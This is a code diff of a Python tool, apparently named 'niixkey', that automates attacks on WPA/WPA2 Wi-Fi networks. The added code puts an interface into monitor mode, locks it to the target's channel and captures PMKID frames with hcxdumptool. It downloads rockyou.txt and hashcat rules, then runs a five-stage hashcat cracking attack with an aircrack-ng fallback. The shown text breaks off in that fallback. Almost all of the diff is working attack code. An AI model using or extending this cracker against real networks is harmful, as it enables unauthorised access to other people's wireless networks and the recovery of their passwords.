     try:
-        with open(filter_file, 'w') as f:
-            f.write(bssid_clean + '\n')
+        with open(filter_file, 'w') as fh:
+            fh.write(bssid_clean + '\n')
     except Exception:
         filter_file = None
 
-    # Stop NetworkManager etc so they don't interfere
+    # ── Kill interfering processes then enable monitor mode ──────────
     try:
         subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                        capture_output=True, timeout=10)
     except Exception:
         pass
 
-    cmd = ['sudo', 'hcxdumptool', '-i', interface, '-o', pcapng_file,
-           '--active_beacon', '--enable_status=3']
-    if filter_file:
-        cmd += ['--filterlist_ap=' + filter_file, '--filtermode=2']
+    info(f"Enabling monitor mode on  {c(interface, C.BWHITE)}…")
+    try:
+        subprocess.run(['sudo', 'airmon-ng', 'start', interface],
+                       capture_output=True, timeout=15)
+        mon_iface = get_monitor_interface(interface)
+        # If airmon-ng didn't create a new interface, set channel manually and use as-is
+        if not os.path.exists(f'/sys/class/net/{mon_iface}'):
+            mon_iface = interface
+            subprocess.run(['sudo', 'ip', 'link', 'set', mon_iface, 'up'],
+                           capture_output=True, timeout=5)
+        MONITOR_IFACE = mon_iface
+        ok(f"Monitor interface  {c(mon_iface, C.BWHITE, C.BOLD)}")
+    except Exception as e:
+        warn(f"Could not enable monitor mode: {e} — trying on raw interface")
+        mon_iface = interface
+
+    # Lock to target channel so we don't miss PMKID frames
+    try:
+        subprocess.run(['sudo', 'iw', 'dev', mon_iface, 'set', 'channel', str(channel)],
+                       capture_output=True, timeout=5)
+        info(f"Locked to channel  {c(str(channel), C.BCYAN)}")
+    except Exception:
+        pass
+
+    # ── Build hcxdumptool command from runtime help introspection ────
+    cmd, flag_notes = get_hcxdumptool_flags(mon_iface, pcapng_file, filter_file)
+    info(f"Flags detected:  {c(flag_notes, C.DIM)}")
+    info(f"Command:  {c(' '.join(cmd), C.DIM)}")
+    print()
+
+    proc        = None
+    found_pmkid = False
+    pb          = None
 
     try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        pb   = ProgressBar(timeout, label='PMKID hunting  ')
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+
+        # Determine which converter binary is available
+        converter = None
+        for cv in ['hcxpcapngtool', 'hcxpcaptool']:
+            if check_tool(cv):
+                converter = cv
+                break
+
+        if not converter:
+            warn("Neither hcxpcapngtool nor hcxpcaptool found — cannot convert captures")
+
+        pb    = ProgressBar(timeout, label='PMKID hunting  ')
         pb.start()
 
-        # Poll for early PMKID capture every 5 s
-        start = time.time()
-        found_pmkid = False
+        start        = time.time()
+        last_size    = 0
+        last_convert = 0
+        convert_interval = 10   # try conversion every 10 s
+
         while time.time() - start < timeout:
-            time.sleep(5)
-            if os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 50:
-                # Quick check via hcxpcapngtool / hcxpcaptool
-                converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else 'hcxpcaptool'
-                if check_tool(converter):
+            # Check if hcxdumptool died early
+            if proc.poll() is not None:
+                stderr_out = proc.stdout.read() if proc.stdout else ''
+                pb.stop()
+                pb = None
+                warn(f"hcxdumptool exited early (rc={proc.returncode})")
+                if stderr_out:
+                    warn(f"Output: {stderr_out.strip()[:300]}")
+                break
+
+            now      = time.time()
+            cur_size = os.path.getsize(pcapng_file) if os.path.exists(pcapng_file) else 0
+
+            # Show live feedback on whether packets are arriving
+            if cur_size > last_size:
+                last_size = cur_size
+
+            # Attempt conversion every `convert_interval` seconds once file is non-trivial
+            if converter and cur_size > 100 and (now - last_convert) >= convert_interval:
+                last_convert = now
+                try:
                     r = subprocess.run(
                         [converter, '-o', hash_file, pcapng_file],
-                        capture_output=True, text=True, timeout=15
+                        capture_output=True, text=True, timeout=20
                     )
                     if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                         found_pmkid = True
+                        pb.stop()
+                        pb = None
+                        elapsed = int(time.time() - start)
+                        ok(f"PMKID captured!  {c(hash_file, C.BWHITE)}  "
+                           f"(elapsed {elapsed}s,  pcapng {cur_size} bytes)")
                         break
+                except Exception:
+                    pass
 
-        pb.stop()
-        proc.terminate()
-        proc.wait(timeout=5)
+            time.sleep(2)
+
+        if pb:
+            pb.stop()
+            pb = None
 
     except KeyboardInterrupt:
-        try: pb.stop()
-        except Exception: pass
+        if pb:
+            try: pb.stop()
+            except Exception: pass
         print()
-        warn("PMKID capture interrupted")
-        try: proc.terminate()
-        except Exception: pass
+        warn("PMKID capture interrupted by user")
         found_pmkid = False
+
     except Exception as e:
-        try: pb.stop()
-        except Exception: pass
+        if pb:
+            try: pb.stop()
+            except Exception: pass
         warn(f"PMKID capture error: {e}")
         found_pmkid = False
+
     finally:
+        if proc and proc.poll() is None:
+            proc.terminate()
+            try: proc.wait(timeout=5)
+            except Exception: pass
+        # Stop monitor mode
+        if MONITOR_IFACE:
+            try:
+                subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
+                               capture_output=True, timeout=10)
+                MONITOR_IFACE = None
+            except Exception:
+                pass
         restart_network_manager()
 
-    # Final conversion attempt if not done yet
-    if not found_pmkid and os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 50:
-        converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else 'hcxpcaptool'
-        if check_tool(converter):
-            r = subprocess.run([converter, '-o', hash_file, pcapng_file],
-                               capture_output=True, timeout=15)
-            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
-                found_pmkid = True
+    # ── Final conversion pass on whatever was captured ───────────────
+    if not found_pmkid and os.path.exists(pcapng_file):
+        cur_size = os.path.getsize(pcapng_file)
+        if cur_size > 100:
+            info(f"Running final conversion on {cur_size}-byte capture…")
+            converter = next(
+                (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
+            )
+            if converter:
+                try:
+                    subprocess.run([converter, '-o', hash_file, pcapng_file],
+                                   capture_output=True, timeout=20)
+                    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
+                        found_pmkid = True
+                        ok(f"PMKID extracted in final pass!  {c(hash_file, C.BWHITE)}")
+                except Exception as e:
+                    warn(f"Final conversion failed: {e}")
+        else:
+            warn(f"pcapng file too small ({cur_size} bytes) — AP may not support PMKID")
+            info("Some APs (especially WPA3-SAE only) will never emit a PMKID")
+            info("The handshake capture phase will still work on these APs")
 
-    if found_pmkid:
-        ok(f"PMKID captured!  {c(hash_file, C.BWHITE)}")
-        return hash_file
-    else:
-        warn("No PMKID captured from this AP")
-        return None
+    if not found_pmkid:
+        warn("No PMKID captured — proceeding to handshake capture")
+
+    return hash_file if found_pmkid else None
 
 
-def crack_pmkid_hash(hash_file, bssid):
+ROCKYOU_URLS = [
+    'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
+    'https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/rockyou.txt.gz',
+]
+ROCKYOU_LOCAL = '/opt/wordlists/rockyou.txt'
+
+
+def find_or_fetch_wordlist():
     """
-    Crack a hc22000 PMKID/EAPOL hash file with hashcat (mode 22000).
-    Falls back to aircrack-ng if hashcat is unavailable.
-    Returns the plaintext password or None.
+    Find the best available wordlist.  Priority:
+      1. Any known system path that already exists
+      2. Decompress rockyou.txt.gz if found
+      3. Download rockyou.txt from GitHub (~130 MB) with progress
+      4. Ask the user for a custom path
+      5. Fall back to a minimal built-in list (last resort)
+    Returns the path to a usable plaintext wordlist.
     """
-    info(f"Cracking PMKID hash  {c(hash_file, C.BWHITE)}")
-
-    wordlist_candidates = [
+    candidates = [
         '/usr/share/wordlists/rockyou.txt',
-        '/usr/share/wordlists/rockyou.txt.gz',
-        '/usr/share/john/password.lst',
-        '/usr/share/dict/words',
         '/opt/wordlists/rockyou.txt',
+        '/usr/share/john/password.lst',
         '/usr/share/wordlists/fasttrack.txt',
+        '/usr/share/dict/words',
+        os.path.expanduser('~/rockyou.txt'),
     ]
-    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)
 
-    if not wordlist:
-        warn("No wordlist found — generating minimal test list…")
-        wordlist = '/tmp/niixkey_test_passwords.txt'
-        common = [
+    # 1. Already exists?
+    for path in candidates:
+        if os.path.exists(path) and os.path.getsize(path) > 100_000:
+            ok(f"Wordlist found:  {c(path, C.BWHITE)}  "
+               f"({os.path.getsize(path)//1_000_000} MB)")
+            return path
+
+    # 2. Decompress .gz if present?
+    gz_candidates = [
+        '/usr/share/wordlists/rockyou.txt.gz',
+        '/opt/wordlists/rockyou.txt.gz',
+    ]
+    for gz in gz_candidates:
+        if os.path.exists(gz):
+            dest = gz.replace('.gz', '')
+            info(f"Decompressing {gz}…")
+            try:
+                import gzip
+                with gzip.open(gz, 'rb') as fin, open(dest, 'wb') as fout:
+                    shutil.copyfileobj(fin, fout)
+                ok(f"Decompressed to  {c(dest, C.BWHITE)}")
+                return dest
+            except Exception as e:
+                warn(f"Decompression failed: {e}")
+
+    # 3. Try to download rockyou.txt
+    warn("No wordlist found on this system.")
+    info("rockyou.txt (~130 MB) is needed for effective cracking.")
+    resp = ask("Download rockyou.txt now? [Y/n]")
+    if resp.strip().lower() in ('', 'y', 'yes'):
+        os.makedirs(os.path.dirname(ROCKYOU_LOCAL), exist_ok=True)
+        downloaded = False
+        for url in ROCKYOU_URLS:
+            info(f"Downloading from  {c(url, C.DIM)}")
+            try:
+                import urllib.request
+                tmp_path = ROCKYOU_LOCAL + '.tmp'
+
+                def reporthook(count, block_size, total_size):
+                    if total_size > 0:
+                        pct  = min(count * block_size / total_size, 1.0)
+                        done = int(40 * pct)
+                        bar  = c('█' * done, C.BCYAN, C.BOLD) + c('░' * (40 - done), C.DIM)
+                        mb   = count * block_size / 1_000_000
+                        tot  = total_size / 1_000_000
+                        print(f"\r  [{bar}]  {mb:.1f}/{tot:.1f} MB  ", end='', flush=True)
+
+                urllib.request.urlretrieve(url, tmp_path, reporthook)
+                print()
+
+                # If it's a .gz, decompress it
+                if url.endswith('.gz') or tmp_path.endswith('.gz'):
+                    import gzip
+                    info("Decompressing…")
+                    with gzip.open(tmp_path, 'rb') as fin, open(ROCKYOU_LOCAL, 'wb') as fout:
+                        shutil.copyfileobj(fin, fout)
+                    os.remove(tmp_path)
+                else:
+                    os.rename(tmp_path, ROCKYOU_LOCAL)
+
+                if os.path.exists(ROCKYOU_LOCAL) and os.path.getsize(ROCKYOU_LOCAL) > 100_000:
+                    ok(f"rockyou.txt saved to  {c(ROCKYOU_LOCAL, C.BWHITE)}  "
+                       f"({os.path.getsize(ROCKYOU_LOCAL)//1_000_000} MB)")
+                    downloaded = True
+                    return ROCKYOU_LOCAL
+            except Exception as e:
+                warn(f"Download failed ({url}): {e}")
+
+        if not downloaded:
+            err("All download attempts failed.")
+            info("You can manually place rockyou.txt at:  /opt/wordlists/rockyou.txt")
+
+    # 4. Ask for custom path
+    resp = ask("Enter path to a wordlist file (or press Enter to use built-in mini list):")
+    custom = resp.strip()
+    if custom and os.path.exists(custom) and os.path.getsize(custom) > 0:
+        ok(f"Using custom wordlist:  {c(custom, C.BWHITE)}")
+        return custom
+    if custom:
+        warn(f"File not found: {custom}")
+
+    # 5. Absolute last resort — tiny built-in list
+    warn("Using built-in mini wordlist — very unlikely to crack a real password!")
+    warn("Get rockyou.txt for serious cracking: place it at /opt/wordlists/rockyou.txt")
+    mini = '/tmp/niixkey_mini.txt'
+    with open(mini, 'w') as f:
+        f.write('\n'.join([
             'password', '12345678', 'admin', 'qwerty', '123456789',
             'password123', 'letmein', 'welcome', 'monkey', '1234567890',
             'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
             'princess', 'admin123', 'wifi123', 'home1234', 'network1',
-        ]
-        with open(wordlist, 'w') as f:
-            f.write('\n'.join(common))
+            'internet', 'router123', 'connect', '00000000', '11111111',
+        ]))
+    return mini
 
+
+def hashcat_is_functional():
+    """
+    Quick probe: run `hashcat -I` to list OpenCL/CUDA devices.
+    Returns True only if at least one backend device is available.
+    Installs pocl-opencl-icd if no devices found and apt-get is available.
+    """
+    if not check_tool('hashcat'):
+        return False
+
+    def probe():
+        try:
+            r = subprocess.run(['hashcat', '-I'], capture_output=True, text=True, timeout=10)
+            out = (r.stdout + r.stderr).lower()
+            return 'backend device' in out and 'no devices' not in out
+        except Exception:
+            return False
+
+    if probe():
+        return True
+
+    # Try installing CPU OpenCL runtime
+    warn("hashcat: no OpenCL devices — attempting to install pocl-opencl-icd…")
+    try:
+        subprocess.run(
+            ['sudo', 'apt-get', 'install', '-y', 'pocl-opencl-icd'],
+            capture_output=True, timeout=120
+        )
+        if probe():
+            ok("pocl installed — hashcat can now run on CPU")
+            return True
+    except Exception:
+        pass
+
+    warn("hashcat has no OpenCL/CUDA backend — will use aircrack-ng instead")
+    warn("Fix manually:  sudo apt-get install pocl-opencl-icd")
+    return False
+
+
+def get_bundled_rules_dir():
+    """
+    Write a minimal set of hashcat-compatible mutation rules to /tmp/niixkey_rules/
+    so cracking works even without internet or a hashcat install that includes rules.
+    Returns the directory path.
+    """
+    rules_dir = '/tmp/niixkey_rules'
+    os.makedirs(rules_dir, exist_ok=True)
+
+    # best64-equivalent: most common transformations
+    best64 = """\
+:
+l
+u
+c
+r
+d
+$1
+$2
+$3
+$!
+$@
+$#
+^1
+^2
+^3
+sa@
+si1
+so0
+se3
+ss5
+$1$2$3
+$1$2$3$4
+$!$!
+c$1
+c$1$2$3
+c$!
+u$1
+r$1
+d$1
+$s
+ss5 se3 sa@
+[ 
+]
+}
+{
+$0
+$9
+$123
+$1234
+$12345
+$123456
+$1234567
+$12345678
+$0$0$0
+T0
+T1
+i0!
+i0@
+"""
+    best64_path = os.path.join(rules_dir, 'best64.rule')
+    if not os.path.exists(best64_path):
+        open(best64_path, 'w').write(best64)
+
+    # toggles: tries capitalising each letter position
+    toggles = '\n'.join(f'T{i}' for i in range(20))
+    toggles_path = os.path.join(rules_dir, 'toggles1.rule')
+    if not os.path.exists(toggles_path):
+        open(toggles_path, 'w').write(toggles)
+
+    return rules_dir
+
+
+def run_hashcat_attack(hash_file, wordlist, pot_file, extra_args=None, label='hashcat'):
+    """
+    Run a single hashcat mode-22000 attack and return the cracked password or None.
+    Returns None immediately if hashcat exits with 'No devices found/left'.
+    """
+    cmd = [
+        'hashcat', '-m', '22000', hash_file, wordlist,
+        '--potfile-path', pot_file,
+        '--status', '--status-timer=30',
+        '-O', '--force',
+    ]
+    if extra_args:
+        cmd += extra_args
+
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                text=True, bufsize=1)
+        no_devices = False
+        for line in proc.stdout:
+            stripped = line.strip()
+            if not stripped:
+                continue
+            low = stripped.lower()
+            if 'no devices found' in low or 'no devices left' in low:
+                no_devices = True
+                warn("hashcat: no OpenCL devices — cannot run GPU/CPU cracking")
+                proc.terminate()
+                break
+            elif any(kw in low for kw in ('error', 'no hashes', 'invalid')):
+                warn(stripped)
+            elif 'exhausted' in low or 'recovered' in low:
+                ok(stripped)
+            else:
+                print(f"  {c(stripped, C.DIM)}", end='\r', flush=True)
+        proc.wait()
+        print()
+        if no_devices:
+            return None
+    except KeyboardInterrupt:
+        try: proc.terminate(); proc.wait()
+        except Exception: pass
+        warn(f"{label} interrupted")
+        return None
+    except Exception as e:
+        warn(f"{label} error: {e}")
+        return None
+
+    if os.path.exists(pot_file) and os.path.getsize(pot_file) > 0:
+        try:
+            lines = open(pot_file).read().strip().splitlines()
+            for line in reversed(lines):
+                line = line.strip()
+                if ':' in line:
+                    return line.rsplit(':', 1)[-1]
+        except Exception:
+            pass
+    return None
+
+
+def find_hashcat_rules():
+    """
+    Return a dict of label -> path for available hashcat rule files.
+    If rules aren't found locally, download them from the hashcat GitHub repo.
+    """
+    search_dirs = [
+        '/usr/share/hashcat/rules',
+        '/usr/lib/hashcat/rules',
+        '/opt/hashcat/rules',
+        os.path.expanduser('~/.local/share/hashcat/rules'),
+        '/opt/wordlists/rules',
+    ]
+    wanted = {
+        'best64':    'best64.rule',
+        'dive':      'dive.rule',
+        'toggles1':  'toggles1.rule',
+        'leetspeak': 'leetspeak.rule',
+        'd3ad0ne':   'd3ad0ne.rule',
+    }
+    found = {}
+    for d in search_dirs:
+        if not os.path.isdir(d):
+            continue
+        for label, filename in wanted.items():
+            if label not in found:
+                path = os.path.join(d, filename)
+                if os.path.exists(path):
+                    found[label] = path
+
+    # Download missing rules from hashcat GitHub
+    missing = [lbl for lbl in wanted if lbl not in found]
+    if missing:
+        rules_dir = '/opt/wordlists/rules'
+        base_url  = 'https://raw.githubusercontent.com/hashcat/hashcat/master/rules'
+        try:
+            import urllib.request
+            os.makedirs(rules_dir, exist_ok=True)
+            for label in missing:
+                filename = wanted[label]
+                dest     = os.path.join(rules_dir, filename)
+                url      = f'{base_url}/{filename}'
+                try:
+                    info(f"Downloading rule:  {c(filename, C.DIM)}")
+                    urllib.request.urlretrieve(url, dest)
+                    if os.path.exists(dest) and os.path.getsize(dest) > 0:
+                        found[label] = dest
+                        ok(f"Downloaded {filename}")
+                except Exception as e:
+                    warn(f"Could not download {filename}: {e}")
+        except Exception as e:
+            warn(f"Rule download failed: {e}")
+
+    if found:
+        ok(f"Hashcat rules available: {c(', '.join(found.keys()), C.DIM)}")
+    else:
+        warn("No hashcat rules found — stages 2 and 3 will be skipped")
+
+    return found
+
+
+def crack_pmkid_hash(hash_file, bssid):
+    """
+    Multi-stage hashcat attack on a hc22000 PMKID hash.
+
+    Stage 1: Straight wordlist (rockyou.txt)       — catches most real passwords
+    Stage 2: best64.rule mutations                 — common variations (l33t, caps, append digits)
+    Stage 3: dive.rule  (if available)             — deeper mutation set
+    Stage 4: Combinator — wordlist + wordlist       — two-word passphrases
+    Stage 5: Mask attack — 8-digit numbers only    — catches default ISP PINs
+
+    Stops as soon as any stage cracks it.
+    """
+    info(f"Cracking PMKID hash  {c(hash_file, C.BWHITE)}")
+
+    wordlist = find_or_fetch_wordlist()
     info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
 
-    # ── hashcat mode 22000 (hc22000 = WPA2/WPA3 PMKID + EAPOL) ──
-    if check_tool('hashcat'):
-        info("Running hashcat mode 22000 (GPU-accelerated)…")
-        pot_file = '/tmp/niixkey_hashcat.pot'
-        try:
-            cmd = [
-                'hashcat', '-m', '22000',
-                hash_file, wordlist,
-                '--potfile-path', pot_file,
-                '--status', '--status-timer=10',
-                '--quiet',
-                '-O',    # optimised kernels
-            ]
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                    text=True, bufsize=1)
-            password = None
-            while True:
-                line = proc.stdout.readline()
-                if line == '' and proc.poll() is not None:
-                    break
-                if line.strip():
-                    if 'Cracked' in line or ':' in line:
-                        print(f"  {c(line.rstrip(), C.DIM)}", end='\r')
-            proc.wait()
+    if not check_tool('hashcat') or not hashcat_is_functional():
+        warn("hashcat unavailable or no OpenCL backend — skipping all hashcat stages")
+        info("Install CPU OpenCL:  sudo apt-get install pocl-opencl-icd")
+        return None
 
-            # Read pot file for result
-            if os.path.exists(pot_file):
-                with open(pot_file) as pf:
-                    for line in pf:
-                        line = line.strip()
-                        if ':' in line:
-                            password = line.rsplit(':', 1)[-1]
-                            break
+    pot_file = f'/tmp/niixkey_{int(time.time())}.pot'
+    rules    = find_hashcat_rules()
 
-            if password:
-                print()
-                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
-                return password
-            else:
-                warn("hashcat: password not found in wordlist")
-        except Exception as e:
-            warn(f"hashcat error: {e}")
+    # Use bundled rules as fallback when system rules and downloads both failed
+    bundled_dir = get_bundled_rules_dir()
+    if 'best64' not in rules:
+        bundled_best64 = os.path.join(bundled_dir, 'best64.rule')
+        if os.path.exists(bundled_best64):
+            rules['best64'] = bundled_best64
+            info("Using bundled best64 rules")
+    password = None
 
-    # ── aircrack-ng fallback (works on EAPOL hashes too) ──
-    warn("Falling back to aircrack-ng for PMKID cracking…")
-    return None   # aircrack-ng does not support raw hc22000; caller will try handshake path
+    # ── Stage 1: Plain wordlist ──────────────────────────────────────
+    section_inner = lambda lbl: info(f"Attack stage:  {c(lbl, C.BYELLOW, C.BOLD)}")
+    section_inner("Stage 1/5 — plain wordlist")
+    divider()
+    password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                  label='stage1-plain')
+    divider()
+    if password:
+        ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+        return password
+    warn("Stage 1: not found")
+
+    # ── Stage 2: best64 rules ────────────────────────────────────────
+    rule = rules.get('best64')
+    if rule:
+        section_inner("Stage 2/5 — best64 rule mutations")
+        divider()
+        password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                      extra_args=['-r', rule],
+                                      label='stage2-best64')
+        divider()
+        if password:
+            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+            return password
+        warn("Stage 2: not found")
+    else:
+        warn("best64.rule not found — skipping stage 2")
+
+    # ── Stage 3: dive rules (more mutations) ─────────────────────────
+    rule = rules.get('dive')
+    if rule:
+        section_inner("Stage 3/5 — dive rule mutations (larger set)")
+        divider()
+        password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                      extra_args=['-r', rule],
+                                      label='stage3-dive')
+        divider()
+        if password:
+            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+            return password
+        warn("Stage 3: not found")
+    else:
+        warn("dive.rule not found — skipping stage 3")
+
+    # ── Stage 4: Combinator (wordlist + wordlist, -a 1) ──────────────
+    section_inner("Stage 4/5 — combinator (word + word passphrases)")
+    divider()
+    password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                  extra_args=['-a', '1', wordlist],
+                                  label='stage4-combinator')
+    divider()
+    if password:
+        ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+        return password
+    warn("Stage 4: not found")
+
+    # ── Stage 5: Mask — 8-digit PINs and common router defaults ──────
+    section_inner("Stage 5/5 — mask attack (8-digit PINs & short patterns)")
+    masks = [
+        '?d?d?d?d?d?d?d?d',          # 8 digits  (ISP default PINs)
+        '?d?d?d?d?d?d?d?d?d?d',      # 10 digits
+        '?l?l?l?l?l?l?l?l',          # 8 lowercase letters
+        '?u?l?l?l?l?l?l?d',          # Cap + 6 lower + digit
+    ]
+    for mask in masks:
+        divider()
+        info(f"Mask:  {c(mask, C.DIM)}")
+        password = run_hashcat_attack(hash_file, mask, pot_file,
+                                      extra_args=['-a', '3'],
+                                      label=f'stage5-mask-{mask[:8]}')
+        if password:
+            divider()
+            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+            return password
+    divider()
+    warn("Stage 5: not found")
+
+    err("All hashcat stages exhausted — password not found")
+    info("Try supplying a more targeted wordlist next run")
+    return None
+
+
 
 
 def crack_wpa_password(capture_file, bssid):
-    """Crack WPA/WPA2 4-way handshake using hashcat (hc22000) then aircrack-ng fallback."""
+    """
+    Crack WPA/WPA2 4-way handshake.
+    Converts the .cap to hc22000 then runs the same multi-stage hashcat
+    attack as crack_pmkid_hash.  Falls back to aircrack-ng if hashcat
+    or the converter is unavailable.
+    """
     info(f"Starting dictionary attack on  {c(bssid, C.BCYAN)}")
 
     cap_files = [
         f for f in os.listdir('.')
         if f.startswith(capture_file) and f.endswith('.cap')
     ]
-
     if not cap_files:
         err("No capture files found")
         return None
@@ -1452,81 +2212,106 @@ def crack_wpa_password(capture_file, bssid):
     cap_file = sorted(cap_files)[0]
     info(f"Capture file:  {c(cap_file, C.BWHITE)}")
 
-    wordlist_candidates = [
-        '/usr/share/wordlists/rockyou.txt',
-        '/usr/share/wordlists/rockyou.txt.gz',
-        '/usr/share/john/password.lst',
-        '/usr/share/dict/words',
-        '/opt/wordlists/rockyou.txt',
-        '/usr/share/wordlists/fasttrack.txt',
-    ]
-    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)
-
-    if not wordlist:
-        warn("No wordlist found — generating a small test wordlist…")
-        wordlist = '/tmp/niixkey_test_passwords.txt'
-        common = [
-            'password', '12345678', 'admin', 'qwerty', '123456789',
-            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
-            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
-            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
-        ]
-        with open(wordlist, 'w') as f:
-            f.write('\n'.join(common))
-        info(f"Test wordlist written: {c(wordlist, C.DIM)}")
-
+    wordlist = find_or_fetch_wordlist()
     info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
     print()
 
-    # ── Try hashcat first (faster, GPU) via hc22000 conversion ──
     password = None
-    if check_tool('hashcat'):
-        converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else (
-                    'hcxpcaptool'   if check_tool('hcxpcaptool')   else None)
+    rules    = find_hashcat_rules()
+    pot_file = f'/tmp/niixkey_hs_{int(time.time())}.pot'
+
+    # Use bundled rules as fallback
+    bundled_dir = get_bundled_rules_dir()
+    if 'best64' not in rules:
+        bundled_best64 = os.path.join(bundled_dir, 'best64.rule')
+        if os.path.exists(bundled_best64):
+            rules['best64'] = bundled_best64
+            info("Using bundled best64 rules")
+
+    # ── Convert .cap → hc22000 for hashcat ──────────────────────────
+    hash_file = None
+    if check_tool('hashcat') and hashcat_is_functional():
+        converter = next(
+            (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
+        )
         if converter:
-            hash_file = f'/tmp/niixkey_handshake_{int(time.time())}.hc22000'
+            hash_file = f'/tmp/niixkey_hs_{int(time.time())}.hc22000'
             r = subprocess.run([converter, '-o', hash_file, cap_file],
                                capture_output=True, timeout=30)
-            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
-                info("Converted capture to hc22000 — running hashcat mode 22000…")
-                divider()
-                pot_file = '/tmp/niixkey_hashcat_hs.pot'
-                cmd = [
-                    'hashcat', '-m', '22000', hash_file, wordlist,
-                    '--potfile-path', pot_file,
-                    '--status', '--status-timer=15',
-                    '--quiet', '-O',
-                ]
-                try:
-                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                            text=True, bufsize=1)
-                    while True:
-                        line = proc.stdout.readline()
-                        if line == '' and proc.poll() is not None:
-                            break
-                        if line.strip():
-                            print(f"  {c(line.rstrip(), C.DIM)}", end='\r')
-                    proc.wait()
-                    divider()
-                    if os.path.exists(pot_file):
-                        with open(pot_file) as pf:
-                            for line in pf:
-                                if ':' in line.strip():
-                                    password = line.strip().rsplit(':', 1)[-1]
-                                    break
-                except Exception as e:
-                    warn(f"hashcat error: {e}")
+            if not (os.path.exists(hash_file) and os.path.getsize(hash_file) > 0):
+                warn("Capture conversion failed — hashcat stages skipped")
+                hash_file = None
+    elif check_tool('hashcat'):
+        warn("hashcat has no OpenCL backend — skipping to aircrack-ng")
+        info("Fix:  sudo apt-get install pocl-opencl-icd")
 
-    # ── aircrack-ng fallback ──────────────────────────────────────
+    if hash_file:
+        section_inner = lambda lbl: info(f"Attack stage:  {c(lbl, C.BYELLOW, C.BOLD)}")
+
+        # Stage 1: plain wordlist
+        section_inner("Stage 1/5 — plain wordlist")
+        divider()
+        password = run_hashcat_attack(hash_file, wordlist, pot_file, label='stage1-plain')
+        divider()
+        if password:
+            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+
+        # Stage 2: best64 rules
+        if not password and rules.get('best64'):
+            section_inner("Stage 2/5 — best64 rule mutations")
+            divider()
+            password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                          extra_args=['-r', rules['best64']],
+                                          label='stage2-best64')
+            divider()
+            if password:
+                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+
+        # Stage 3: dive rules
+        if not password and rules.get('dive'):
+            section_inner("Stage 3/5 — dive rule mutations")
+            divider()
+            password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                          extra_args=['-r', rules['dive']],
+                                          label='stage3-dive')
+            divider()
+            if password:
+                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+
+        # Stage 4: combinator
+        if not password:
+            section_inner("Stage 4/5 — combinator (word + word)")
+            divider()
+            password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                          extra_args=['-a', '1', wordlist],
+                                          label='stage4-combinator')
+            divider()
+            if password:
+                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+
+        # Stage 5: mask
+        if not password:
+            section_inner("Stage 5/5 — mask attack (PINs & short patterns)")
+            for mask in ['?d?d?d?d?d?d?d?d', '?d?d?d?d?d?d?d?d?d?d',
+                         '?l?l?l?l?l?l?l?l', '?u?l?l?l?l?l?l?d']:
+                divider()
+                info(f"Mask:  {c(mask, C.DIM)}")
+                password = run_hashcat_attack(hash_file, mask, pot_file,
+                                              extra_args=['-a', '3'],
+                                              label=f'stage5-{mask[:8]}')
+                if password:
+                    ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+                    break
+            divider()
+
+    # ── aircrack-ng fallback (no hashcat or conversion failed) ───────
     if not password:
         info(c("Running aircrack-ng dictionary attack…", C.DIM))
         divider()
         try:
-            cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
-            process = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                text=True, bufsize=1, universal_newlines=True
-            )
+            cmd     = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       text=True, bufsize=1)
             while True:
                 output = process.stdout.readline()
